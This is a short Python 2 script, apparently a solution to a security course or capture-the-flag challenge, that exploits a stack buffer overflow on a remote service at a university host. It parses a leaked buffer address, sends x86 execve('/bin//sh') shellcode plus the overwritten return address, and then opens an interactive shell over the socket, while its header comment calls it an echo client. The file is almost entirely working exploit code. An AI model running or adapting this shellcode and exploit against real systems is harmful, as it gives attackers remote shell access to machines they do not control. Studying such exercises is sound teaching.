# Echo client program
import telnetlib
import socket,sys

# The remote host
host = 'secprog.cs.nctu.edu.tw' 
port = 10101

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

buf = s.recv(64)
sys.stdout.write(buf)
sys.stdout.flush()

buf_addr = buf[13:21].decode("hex")
print "buf_addr: " + buf_addr.encode("hex")

shellcode = "\x90\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80\x90"
payload = shellcode + buf_addr[::-1] + "\n"
s.send(payload)
print payload

t = telnetlib.Telnet()
t.sock = s 
t.interact()
